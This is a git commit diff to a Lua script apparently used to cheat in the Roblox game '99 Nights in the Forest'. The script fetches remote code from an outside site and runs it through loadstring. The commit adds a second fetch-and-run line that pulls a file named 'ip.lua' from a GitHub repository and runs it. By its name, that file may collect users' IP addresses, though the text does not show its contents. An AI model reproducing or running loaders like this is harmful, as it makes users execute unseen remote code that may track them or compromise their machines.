5c6e6abddd857052b5cabfc0fa97f9e0a783c584
xielbers <88589081+xielbers@users.noreply.github.com>
2025-10-25 20:17:47 -0300

    Actualizar 99-nights-in-the-forest.lua

--- 99-nights-in-the-forest.lua
+++ 99-nights-in-the-forest.lua
@@ -1,1 +1,5 @@
+_G.script_executed = "99-nights-in-the-forest.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet('https://nazuro.xyz/99nights'))()
